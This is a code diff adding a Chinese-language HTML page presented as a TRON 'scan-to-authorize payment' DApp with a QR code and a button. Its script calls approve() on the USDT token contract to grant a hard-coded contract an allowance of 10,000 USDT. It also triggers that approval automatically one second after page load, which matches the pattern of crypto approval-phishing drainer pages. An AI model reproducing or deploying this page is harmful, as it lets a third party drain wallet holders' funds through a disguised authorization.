@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON 扫码授权 DApp</title>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+</head>
+<body>
+
+    <h1>TRON 扫码授权支付</h1>
+    <p>请使用 TronLink、IM 钱包或 TP 钱包扫描二维码并在钱包中完成授权</p>
+
+    <div id="qrcode"></div>
+    <p>或者点击下面按钮授权：</p>
+    <button id="approveBtn">点击授权 10000 USDT</button>
+    <div id="status"></div>
+
+    <script>
+        // ==== 配置你的信息 ====
+        const contractAddress = "TNWbePcFNPKoKsjDgMLrzHV4bFeHTUPVsj";
+        const tokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const paymentAmount = "10000000000"; // 10000 USDT，TRC20 6 位小数
+
+        // 生成二维码指向当前页面（扫码打开 DApp 页面）
+        const currentUrl = window.location.href;
+        QRCode.toDataURL(currentUrl)
+            .then(url => {
+                const img = document.createElement('img');
+                img.src = url;
+                img.alt = 'TRON 扫码授权二维码';
+                document.getElementById('qrcode').appendChild(img);
+            })
+            .catch(err => console.error(err));
+
+        // 授权函数
+        async function approveUSDT() {
+            if (typeof window.tronWeb === 'undefined') {
+                document.getElementById('status').innerText = '请先安装 TronLink 或打开支持 TRON 钱包的 DApp 浏览器';
+                return;
+            }
+
+            const tronWeb = window.tronWeb;
+
+            try {
+                const contract = await tronWeb.contract().at(tokenAddress);
+                const tx = await contract.approve(contractAddress, paymentAmount).send();
+                document.getElementById('status').innerText = '授权交易已发送，交易ID：' + tx;
+            } catch (err) {
+                console.error(err);
+                document.getElementById('status').innerText = '授权失败：' + err.message;
+            }
+        }
+
+        // 点击按钮触发授权
+        document.getElementById('approveBtn').addEventListener('click', approveUSDT);
+
+        // 页面加载完成后自动尝试调用（仅 TronLink）
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (typeof window.tronWeb !== 'undefined') {
+                    approveUSDT();
+                }
+            }, 1000);
+        });
+    </script>
+
+</body>
+</html>
